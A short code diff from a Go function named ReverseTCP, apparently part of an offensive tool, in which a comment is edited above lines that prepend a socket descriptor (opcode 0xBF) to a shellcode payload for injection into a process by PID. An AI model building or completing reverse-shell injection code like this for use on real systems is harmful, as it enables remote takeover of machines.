@@ -61,7 +61,7 @@ func ReverseTCP(hostAndPort string, pid int) error {
 		return err
 	}
 
-	// move SOCKET value to the EDI register on x86 (or RSI on x86_64)
+	// move SOCKET value to the EDI register
 	socketFD := getFDBytes(socket.(*net.TCPConn))
 	payload = append(append([]byte{0xBF}, socketFD...), payload...)
 
